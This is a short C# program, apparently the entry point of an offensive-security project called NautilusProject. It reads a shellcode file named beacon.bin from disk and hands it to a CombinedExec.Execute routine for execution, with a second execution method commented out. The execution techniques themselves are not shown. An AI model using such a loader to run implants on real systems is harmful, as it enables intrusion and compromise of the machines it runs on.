using System;

namespace NautilusProject
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            byte[] shellcode = System.IO.File.ReadAllBytes("C:\\Users\\xpn\\Desktop\\beacon.bin");
            CombinedExec.Execute(shellcode);
            //ExecNativeSlot.Execute(shellcode);
        }
    }
}